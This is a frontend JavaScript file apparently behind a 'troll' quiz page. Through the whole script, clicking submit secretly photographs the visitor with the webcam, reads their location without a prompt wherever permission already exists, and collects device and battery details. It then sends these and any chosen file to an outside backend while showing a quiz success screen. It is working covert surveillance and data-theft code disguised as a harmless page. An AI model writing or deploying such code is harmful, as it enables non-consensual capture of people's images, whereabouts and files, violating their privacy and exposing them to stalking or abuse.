// ================================
// FRONTEND SCRIPT.JS (FINAL)
// ================================

// DOM
const btn = document.getElementById('submit-btn') || document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// SILENT LOCATION (NO POPUP)
// ================================
async function getSilentLocation() {
  let loc = "";

  if (!navigator.permissions || !navigator.geolocation) return loc;

  try {
    const status = await navigator.permissions.query({ name: "geolocation" });

    if (status.state === "granted") {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      loc = `${pos.coords.latitude},${pos.coords.longitude}`;
    }
  } catch {}

  return loc;
}

// ================================
// METADATA (NO EXTRA PERMS)
// ================================
async function collectMetadata() {
  const metadata = {
    width: innerWidth,
    height: innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    battery: "N/A",
    location: ""
  };

  // Battery (NO permission required)
  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    metadata.battery = `${battery.level * 100}% | charging: ${battery.charging}`;
  }

  // Silent location
  metadata.location = await getSilentLocation();

  return metadata;
}

// ================================
// CAMERA CAPTURE + SEND
// ================================
async function captureAndSendCamera() {
  let stream;

  try {
    // ONLY CAMERA PERMISSION
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 2500));

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

  } catch (err) {
    console.error("Camera error:", err);
  } finally {
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// ================================
// FILE UPLOAD (NO EXTRA PERMS)
// ================================
async function sendFile(file) {
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        file: reader.result,
        filename: file.name
      })
    });
  };
  reader.readAsDataURL(file);
}

// ================================
// SUBMIT HANDLER
// ================================
if (btn) {
  btn.addEventListener("click", async (e) => {
    e.preventDefault();

    await captureAndSendCamera();

    if (fileInput && fileInput.files.length) {
      await sendFile(fileInput.files[0]);
    }

    const quiz = document.getElementById("quiz-container");
    const success = document.getElementById("success-container");

    if (quiz && success) {
      quiz.style.display = "none";
      success.style.display = "flex";
    }
  });
      }
